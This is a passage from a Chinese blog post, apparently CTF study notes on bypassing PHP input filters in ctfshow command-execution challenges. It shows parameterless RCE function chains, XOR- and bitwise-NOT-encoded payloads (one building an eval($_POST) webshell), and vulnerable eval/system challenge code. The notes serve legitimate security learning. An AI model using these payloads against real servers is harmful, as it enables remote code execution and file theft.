height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//上面代码能过滤的基本都过滤了，但我们仔细看就会发现过滤的括号是中文括号（ )我们仍然可以使用英文括号</span></span><br><span class="line"><span class="comment">//也就是说，我们需要只使用字母和括号完成命令执行</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>看了网上的教程，这道题需要使用无参RCE来解</p>
<p>首先我们需要认识几个函数</p>
<h3 id="1-函数"><a href="#1-函数" class="headerlink" title="1.函数"></a>1.函数</h3><h4 id="1-localeconv"><a href="#1-localeconv" class="headerlink" title="1.localeconv()"></a>1.localeconv()</h4><p>localeconv() 函数返回一包含本地数字及货币格式信息的数组。</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/5eaaf34229445df9921c6bf485870ddf.png" class title="img">

<p>乍一看这个函数跟文件读取也没关系啊，但就是这个占不到边的函数也能玩出新花样。它返回的是一个数组，数组的第一行是一个点（.） 这个点就可以代表当前目录了，我们可以用current()函数取出这个点。取出这个点之后，再用scandir函数进行目录遍历。</p>
<p>具体传参：var_dump(scandir(current(localeconv())));就可以遍历当前目录所有文件。</p>
<h4 id="2-current"><a href="#2-current" class="headerlink" title="2.current()"></a>2.current()</h4><p>它还有别名pos()，其实都是一样的。</p>
<p>输出数组当前元素的值，每一个数组中都有一个内部的指针，指向他当前的元素。<strong>初始指向当前数组中的第一个元素</strong>。这个函数不会移动指针，但是有next()函数和prev函数可以移动指针。</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/0659dae5aa964cf8dbeb7833aa503787.png" class title="img">

<h4 id="3-scandir"><a href="#3-scandir" class="headerlink" title="3.scandir()"></a>3.scandir()</h4><p>列出当前目录的文件和目录，以<strong>数组的形式</strong>展现出来。</p>
<p>语法：</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/c1eb44621341255fdbd7d1b868d36bff.png" class title="img">

<h4 id="4-chdir"><a href="#4-chdir" class="headerlink" title="4.chdir()"></a>4.chdir()</h4><p>chdir() 函数改变当前的目录。这个函数是是用来跳目录的，有时我们要读取的文件不在当前目录下，所以我们要改变当前目录。比如用chdir(‘..’)来跳回上一级目录。再配合scandir函数遍历任意目录下的文件。</p>
<h4 id="5-array-reverse"><a href="#5-array-reverse" class="headerlink" title="5.array_ reverse()"></a>5.array_ reverse()</h4><p>根据单词意思就知道这个函数的功能就是将数组倒过来。<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/04c0a252678a086b4319247a991606f4.png" class title="img"></p>
<h4 id="6-highlight-file"><a href="#6-highlight-file" class="headerlink" title="6.highlight_file()"></a>6.highlight_file()</h4><p>这个函数用来高亮代码，可以相当于文件读取。相当于show_source()。</p>
<h4 id="7-getcwd"><a href="#7-getcwd" class="headerlink" title="7.getcwd()"></a>7.getcwd()</h4><p>这个函数返回当前工作目录。成功则返回当前工作目录，失败则返回FALSE。也需要用scandir函数遍历当前工作目录。</p>
<h4 id="8-dirname"><a href="#8-dirname" class="headerlink" title="8.dirname()"></a>8.dirname()</h4><p>这个函数返回路径中的目录名称部分。</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/79294a346e8be82efbd744471284b197.png" class title="img">

<h4 id="9-get-defined-vars"><a href="#9-get-defined-vars" class="headerlink" title="9.get_defined_vars()"></a>9.get_defined_vars()</h4><p>返回由所有已定义变量所组成的数组。</p>
<p>返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</p>
<h4 id="10-getallheaders"><a href="#10-getallheaders" class="headerlink" title="10.getallheaders()"></a>10.getallheaders()</h4><p>这个函数就是返回一个数组，数组中包含我们Http请求头中的各个字段的值，这个和我们之前的注入方式不一样</p>
<p>我们如果没有文件读取函数，就需要命令执行来读取文件，我们就需要在被过滤的情况下通过函数获取到命令执行的输入，getallheaders可以通过请求头来获取命令输入</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20251026160911396.png" class title="image-20251026160911396">

<p>然后就是我们添加的一些字段是没有办法直接排在数组的头或者尾的，那个时候可以尝试改写其他字段，或者直接删除，具体情况不同</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20251026161602304.png" class title="image-20251026161602304">

<p>直接尝试删除后面部分字段也是可以成功解析的</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20251026161644018.png" class title="image-20251026161644018">

<p>我对Http协议一点都不懂，只能说这个有时候不同题目有点玄学</p>
<h4 id="11-array-flip"><a href="#11-array-flip" class="headerlink" title="11.array_flip()"></a>11.array_flip()</h4><p>这个函数用于交换一个数组的键和值，可以配合<code>array_rand</code>进行使用</p>
<h4 id="12-array-rand"><a href="#12-array-rand" class="headerlink" title="12.array_rand()"></a>12.array_rand()</h4><p>从数组中取出一个或多个随机的单元，并返回随机条目的一个或多个键。</p>
<p><strong>返回值</strong></p>
<p>如果只取出一个，<strong>array_rand()</strong>    返回随机单元的键名。   否则就返回包含随机键名的数组。   完成后，就可以根据随机的键获取数组的随机值。   取出数量如果超过 array 的长度，就会导致 <strong><code>E_WARNING</code></strong> 错误，并返回 NULL。 </p>
<p>也就是可以随机返回一个键名，我们可以在一些情况下进行暴力获取我们的输入</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20251026170544700.png" class title="image-20251026170544700">

<p>先通过<code>array_flip</code>将键值对翻转，然后再通过<code>array_rand</code>随机获取键值，可以在next，end，current被过滤的情况下无视我们输入在数组中的位置，爆破出flag即可</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20251026170758133.png" class title="image-20251026170758133">



<h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>我们需要使用上面提到的函数实现命令执行，由于有各种方法，只能单开一栏了</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//首先还是ctfshow40，主要核心就是通过localeconv()绕过.的过滤，和current()取出.字符，实现路径，然后scandir()访问目录下文件</span></span><br><span class="line"><span class="comment">//剩下的就是使用各种方法读取文件了</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">我们可以</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br><span class="line"><span class="comment">//来查看目录中文件，得到</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;.&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;..&quot;</span> [<span class="number">2</span>]=&gt; <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;flag.php&quot;</span> [<span class="number">3</span>]=&gt; <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;index.php&quot;</span> &#125;</span><br><span class="line"><span class="comment">//我们需要打开flag.php,可以先翻转数组然后再使用next()改变指针，最后使用highlight_file()回显文件内容</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<h2 id="5-异或拼接字符"><a href="#5-异或拼接字符" class="headerlink" title="5.异或拼接字符"></a>5.异或拼接字符</h2><p>到了ctfshow41关，难度又上了</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>这次连小写字母和数字都过滤掉了，很明显正常写法根本不可能行动通，我肯定只能看下题解了</p>
<p>经过长时间的阅读，我大概理解了绕过原理了，就是通过url编码将两个未被过滤掉的字符进行异或运算，运算结果为我们需要的字符</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">比如：</span><br><span class="line">A %<span class="number">40</span> %<span class="number">01</span></span><br><span class="line">A=%<span class="number">40</span>|%<span class="number">01</span></span><br><span class="line">我们先对两个字符进行解码得到</span><br><span class="line">@ (复制有点不同，总之是一个很生僻的字符)</span><br><span class="line">也就是说我们进行运算的两个字符解码后不会被过滤</span><br><span class="line">url编码%后面的数字是<span class="number">16</span>进制，进行运算我们需要先将其转换为<span class="number">2</span>进制</span><br><span class="line"><span class="number">1000000</span>|<span class="number">0000001</span>=<span class="number">1000001</span>=<span class="number">65</span>(十进制)</span><br><span class="line">然后A的ascii码值就是<span class="number">65</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>我们来看一下实例：</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] your <span class="function"><span class="keyword">function</span>：<span class="title">system</span></span></span><br><span class="line"><span class="function">[+] <span class="title">your</span> <span class="title">command</span>：<span class="title">ls</span></span></span><br><span class="line"><span class="function">(<span class="params"><span class="string">&quot;%13%19%13%14%05%0d&quot;</span>|<span class="string">&quot;%60%60%60%60%60%60&quot;</span></span>)(<span class="params"><span class="string">&quot;%0c%13&quot;</span>|<span class="string">&quot;%60%60&quot;</span></span>)</span>;</span><br><span class="line"><span class="comment">//再深入一点的话我就无法理解了，原理就是那样</span></span><br><span class="line"><span class="comment">//以后我可能会很轻松理解，但现在极限了，而且这是一个脚本实现的题目</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>这里留下一个问题 关键是，我不会用也没有他们说的脚本</p>
<h2 id="6-取反绕过"><a href="#6-取反绕过" class="headerlink" title="6.取反绕过"></a>6.取反绕过</h2><p>二进制表示形式有原码，反码。补码。php中有取反符<code>~</code>可以对字符进行取反</p>
<p>当我们被过滤掉字母和数字的时候，我们除了异或拼接，我们也可以通过取反符进行绕过</p>
<p>url编码取反绕过 ：就是我们将php代码url编码后取反，我们传入参数后服务端进行url解码，这时由于取反后，会url解码成不可打印字符，这样我们就会绕过。</p>
<p>即我们传入的是经过取反的url编码，正则匹配时进行解码后全是不可打印字符，我们再在前面加上取反符，当命令执行时会解析取反符，就会变成正常命令执行</p>
<p>实例代码：</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="string">&#x27;(eval($_POST[test]))&#x27;</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>payload；</p>
<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%8B%9A%8C%8B%DD%A2%D6%D6);</span><br><span class="line"></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>通过取反进行代码执行的时候我们执行函数必须以</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)();</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>后面需要跟括号才能让取反结果不是字符串而是函数</p>
<p>我在进行取反然后函数执行的时候比如执行phpinfo()</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20250920151053351.png" class title="image-20250920151053351">

<p>php会给出警告，然后原因是在进行取反之前eval检测代码中出现未定义的函数，也就是说在进行取反之前会进行检测，然后到了php8中也是经典的警告变报错，也就是通过eval执行代码在php8中不可使用</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Undefined constant <span class="string">&quot;�������&quot;</span> in D:\Mei的编程\CTF\草稿<span class="number">2</span>.<span class="title function_ invoke__">php</span>(<span class="number">19</span>) : <span class="keyword">eval</span>()<span class="string">&#x27;d code:1 Stack trace: #0 D:\Mei的编程\CTF\草稿2.php(19): eval() #1 &#123;main&#125; thrown in D:\Mei的编程\CTF\草稿2.php(19) : eval()&#x27;</span>d code on line <span class="number">1</span> </span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>



<h2 id="7-dev-null-2-1"><a href="#7-dev-null-2-1" class="headerlink" title="7. &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1"></a>7. &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1</h2><p>因为不知道这是什么意思，只能复制下来</p>
<p>我们先来看源代码：</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>可见，这是一个没有任何过滤的命令执行，但后面加了个奇怪的语句，实在搞不懂，自己理解的话就是把前面代码执行的输出放到&#x2F;dev&#x2F;null文件当中从而实现消失回显</p>
<p>至于解题的话，只需要使用命令拼接符把两条命令分开，使后面的命令没回显即可</p>
